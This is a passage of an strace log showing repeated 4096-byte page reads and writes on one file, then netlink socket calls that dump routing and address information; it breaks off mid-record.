read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\1\ \\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\17\\2b\\0\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372\\0031\\v\\234"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\1\ \\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\17\\2b\\0\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372\\0031\\v\\234"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\17\\2b\\0\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372\\0031\\v\\234"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\1\ \\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
write(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
write(3, "\ \\v\\207\\0\\16\\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 28672, seek_set) = 28672
write(3, "\ \\0\\0\\0\\10\\10;\\0\\16\\272\\16\\30\ >\\v\\270\\vn\ \\277\\t\\337\\10;\\0\\0\\0\\0\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\16\\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 28672, seek_set) = 28672
read(3, "\ \\0\\0\\0\\10\\10;\\0\\16\\272\\16\\30\ >\\v\\270\\vn\ \\277\\t\\337\\10;\\0\\0\\0\\0\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 24576, seek_set) = 24576
write(3, "\ \\f\\363\\0\ \\4\\256\\0\\17c\\16t\ \\321\\t\\354\\10\\223\\7\\312\\6\\370\\6!\\5a\\4\\256\\0f\\17\\226"..., 4096) = 4096
lseek(3, 28672, seek_set) = 28672
read(3, "\ \\0\\0\\0\\10\\10;\\0\\16\\272\\16\\30\ >\\v\\270\\vn\ \\277\\t\\337\\10;\\0\\0\\0\\0\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\16\\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 24576, seek_set) = 24576
read(3, "\ \\f\\363\\0\ \\4\\256\\0\\17c\\16t\ \\321\\t\\354\\10\\223\\7\\312\\6\\370\\6!\\5a\\4\\256\\0f\\17\\226"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\16\\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 24576, seek_set) = 24576
read(3, "\ \\f\\363\\0\ \\4\\256\\0\\17c\\16t\ \\321\\t\\354\\10\\223\\7\\312\\6\\370\\6!\\5a\\4\\256\\0f\\17\\226"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\16\\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 24576, seek_set) = 24576
read(3, "\ \\f\\363\\0\ \\4\\256\\0\\17c\\16t\ \\321\\t\\354\\10\\223\\7\\312\\6\\370\\6!\\5a\\4\\256\\0f\\17\\226"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\16\\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 24576, seek_set) = 24576
read(3, "\ \\f\\363\\0\ \\4\\256\\0\\17c\\16t\ \\321\\t\\354\\10\\223\\7\\312\\6\\370\\6!\\5a\\4\\256\\0f\\17\\226"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\16\\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 24576, seek_set) = 24576
read(3, "\ \\f\\363\\0\ \\4\\256\\0\\17c\\16t\ \\321\\t\\354\\10\\223\\7\\312\\6\\370\\6!\\5a\\4\\256\\0f\\17\\226"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\16\\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 24576, seek_set) = 24576
read(3, "\ \\f\\363\\0\ \\4\\256\\0\\17c\\16t\ \\321\\t\\354\\10\\223\\7\\312\\6\\370\\6!\\5a\\4\\256\\0f\\17\\226"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\16\\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 24576, seek_set) = 24576
read(3, "\ \\f\\363\\0\ \\4\\256\\0\\17c\\16t\ \\321\\t\\354\\10\\223\\7\\312\\6\\370\\6!\\5a\\4\\256\\0f\\17\\226"..., 4096) = 4096
ioctl(0, tcgets, {b38400 opost isig icanon echo ...}) = 0
rt_sigaction(sigint, {sa_handler= , sa_mask=[int], sa_flags=sa_restorer|sa_restart, sa_restorer= }, {sa_handler= , sa_mask=[int], sa_flags=sa_restorer|sa_restart, sa_restorer= }, 8) = 0
socket(af_netlink, sock_dgram, netlink_route) = 4
getpid() = 437
sendto(4, {{len=28, type= /* nlmsg_??? */, flags=nlm_f_request| , seq=0, pid=437}, "\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0"}, 28, 0, null, 0) = 28
recvfrom(4, [{{len=52, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2\\0\\0\\0\\376\\3\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\10\\0\\5\\0\ \\246\\231\\241\\10\\0\\4\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2\\33\\0\\0\\376\\2\\375\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\10\\0\\1\\0\ \\246\\231\\240\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2\\30\\0\\0\\376\\3\\0\\1\\4\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\10\\0\\1\\0d`\\1\\0\\10\\0\\5\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2\\30\\0\\0\\376\\3\\0\\1\\4\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\10\\0\\1\\0d`\\5\\0\\10\\0\\5\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2\\30\\0\\0\\376\\3\\0\\1\\4\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\10\\0\\1\\0d`\\7\\0\\10\\0\\5\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2\\30\\0\\0\\376\\3\\0\\1\\4\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\10\\0\\1\\0d`\\t\\0\\10\\0\\5\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2\\30\\0\\0\\376\\2\\375\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\10\\0\\1\\0d`\ \\0\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2\\20\\0\\0\\376\\2\\375\\1\\20\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\10\\0\\1\\0\\254\\21\\0\\0\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\375\\3\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0\ \\246\\231\\240\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\376\\2\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0\ \\246\\231\\272\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\375\\3\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0\ \\246\\231\\277\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\376\\2\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0d`\ \\0\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\375\\3\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0d`\ \\0\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\376\\2\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0d`\ \\1\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\375\\3\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0d`\ \\377\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\375\\3\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0\\177\\0\\0\\0\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2\\10\\0\\0\\377\\2\\376\\2\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0\\177\\0\\0\\0\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\376\\2\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0\\177\\0\\0\\1\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\375\\3\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0\\177\\377\\377\\377\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\375\\3\\20\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0\\254\\21\\0\\0\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\376\\2\\0\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0\\254\\21\\0\\1\\10\\0\\7\\0"...}, {{len=60, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\\2 \\0\\0\\377\\2\\375\\3\\20\\0\\0\\0\\10\\0\\17\\0\\377\\0\\0\\0\\10\\0\\1\\0\\254\\21\\377\\377\\10\\0\\7\\0"...}], 8192, 0, null, null) = 1312
recvfrom(4, [{{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ @\\0\\0\\376\\2\\0\\1\\0\\0\\0\\0\\10\\0\\17\\0\\376\\0\\0\\0\\24\\0\\1\\0\\376\\200\\0\\0\\0\\0\\0\\0"...}, {{len=116, type= /* nlmsg_??? */, flags=nlm_f_multi, seq=0, pid=437}, "\ 